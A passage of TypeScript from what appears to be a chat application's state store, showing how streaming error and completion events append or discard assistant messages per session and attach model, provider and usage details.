        // session on screen; main has persisted it marked incomplete.
        const keepPartial = s.streamingText !== '' && sessionId === s.activeSessionId
        return {
          error: sessionId === s.activeSessionId ? event.error : s.error,
          streamId: null,
          streamingText: '',
          streamNotice: null,
          trustedTurn: false,
          messages: keepPartial
            ? [...s.messages, { id: `local-a-${Date.now()}`, role: 'assistant' as const, content: s.streamingText, createdAt: Date.now(), incomplete: true }]
            : s.messages,
        }
      })
      return
    }
    if (event.type === 'done') {
      // Symmetry with the `text` branch: a `done` racing in after stop() (which
      // already cleared streamId and locally persisted the partial) must not
      // append a second, empty bubble.
      if (get().streamId === null) return
      set((s) => {
        // Only append the assistant message when the user is currently
        // looking at the session the stream belongs to. If they've
        // navigated elsewhere, main has already persisted the reply, so
        // returning to that session later reloads it from disk instead —
        // this is what prevents the reply from leaking into whatever
        // session the user is currently viewing.
        const shouldAppend = sessionId === s.activeSessionId
        // Carry the provenance from the done event so the model badge and cost
        // appear immediately, accurate even when failover changed the model —
        // rather than only after the session is reloaded from disk.
        const provenance = event.type === 'done'
          ? {
              ...(event.model ? { model: event.model } : {}),
              ...(event.provider ? { provider: event.provider } : {}),
              ...(event.usage ? { usage: event.usage } : {}),
            }
          : {}
        return {
          streamId: null,
          streamingText: '',
          streamNotice: null,
          trustedTurn: false,
          messages: shouldAppend
            ? [...s.messages, {
              id: `local-a-${Date.now()}`, role: 'assistant',
              content: s.streamingText, createdAt: Date.now(), ...provenance,
            }]
            : s.messages,
        }
      })
      // Canonicalize ids so edit/fork on the just-finished turn use real
      // persisted ids, not the optimistic local-* ones.
      if (sessionId === get().activeSessionId) void get().refreshMessages()
    }
  },
}))
